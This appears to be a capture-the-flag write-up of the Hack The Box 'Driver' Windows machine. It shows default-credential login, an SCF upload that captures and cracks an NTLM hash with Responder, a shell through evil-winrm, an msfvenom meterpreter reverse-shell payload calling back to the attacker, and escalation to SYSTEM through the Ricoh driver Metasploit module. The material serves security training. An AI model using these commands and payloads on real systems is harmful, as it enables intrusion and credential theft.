

# HTB: Driver
**Platform:** [Hack The Box](https://app.hackthebox.com/machines/Driver)  
**Difficulty:** `Easy`  
**OS:** `Windows`  
---

## Reconnaissance

Today , we will hack a windows machine from HackTheBox named Driver in Easy difficulty.

Starting reconnaissance phase with rustscan, My nmap scan is too slow and take so much time . Thats why i skipped nmap.

```bash
┌──(landau㉿landau)-[~/Downloads/HTB-writeUps/Driver]
└─$ rustscan -a 10.129.95.238 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/landau/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.95.238:80
Open 10.129.95.238:135
Open 10.129.95.238:445

```

Perfect , Lets start with port 80 first.


## Enumeration


We see login page and try admin:admin as name and password and it worked!!!! Perfect!


The first thing we see is Firmware Updates part and there is a file Upload Firmware.

There are several kinds of files that are commonly dropped into a file share to target other users who may browse to the share. If the user browses to the share, their host will try to authenticate to the attacker.And one of them is scf. We search simple scf payload to upload in the internet.And we also have to open responder catch the hash . 

```bash
┌──(landau㉿landau)-[~/Downloads/HTB-writeUps/Driver]
└─$ sudo responder -I tun0
[sudo] password for landau: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.54]
    Responder IPv6             [dead:beef:2::1034]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-RIO8VKXDPLK]
    Responder Domain Name      [8VKL.LOCAL]
    Responder DCE-RPC Port     [47421]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...

tony::DRIVER:d91c9551c81cbf47:5EC09BBB3636F288CEA041DE8AFB66EA:010100000000000000CD1AD403C6DC01FEF7A2D49C71E3540000000002000800580046004C00320001001E00570049004E002D004800350036005700590031004500360035004200440004003400570049004E002D00480035003600570059003100450036003500420044002E00580046004C0032002E004C004F00430041004C0003001400580046004C0032002E004C004F00430041004C0005001400580046004C0032002E004C004F00430041004C000700080000CD1AD403C6DC0106000400020000000800300030000000000000000000000000200000AC64CDC07872FEB30077BD26BFDE0EDB2354A577DC81720E631F951F36510D2B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0035003400000000000000000000000000
```

after using john to crack the hash we find out that password is 'liltony'. 


We use evil-winrm to get shell :

```bash
┌──(landau㉿landau)-[~/Downloads/HTB-writeUps/Driver]
└─$ evil-winrm -u tony -p 'liltony' -i 10.129.95.238
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents>

```

we got the initial access


## Privilege Escalation


Firstly we try whoami /priv to see if this user got any interesting permission 

```bash
*Evil-WinRM* PS C:\Users\tony\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

```

Since we have a shell on the remote machine we can try to obtain a meterpreter session, since meterpreter can be very helpful when searching for local privilege escalation exploits. First, we create a malicious executable that will return a shell back to our local machine when it gets
executed.


```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe > shell.exe
```

Then, we need to configure msfconsole.

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0
set lport 4444
run
```

we got the shelll!!!

Now that we have a valid interactive meterpreter session we can execute the Local Exploit Suggester module and review the output. To use the module on our current session we use the following commands:

```bash
use multi/recon/local_exploit_suggester
```

We have a list of possible working exploits. Given that the main website was mentioning printer software we are more interested on the exploits that relate to printer exploitation. Another hint can be discovered by reading the Powershell history file.


```bash
cat C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1
```

We can also see the driver's name is RICOH PCL6 UniversalDriver V4.23 . Looking at our list of possible exploits we find an exploit module called ricoh_driver_privesc . The close connection of the exploit's name and the installed driver sounds very promising so we decide to proceed with this exploit.

We use the following commands to execute the exploit on the remote machine through our meterpreter
session.

```bash
use exploit/windows/local/ricoh_driver_privesc
set payload windows/x64/meterpreter/reverse_tcp
set session 1
set lhost tun0
run
```

The exploit executed successfully and we have a shell as NT AUTHORITY\SYSTEM
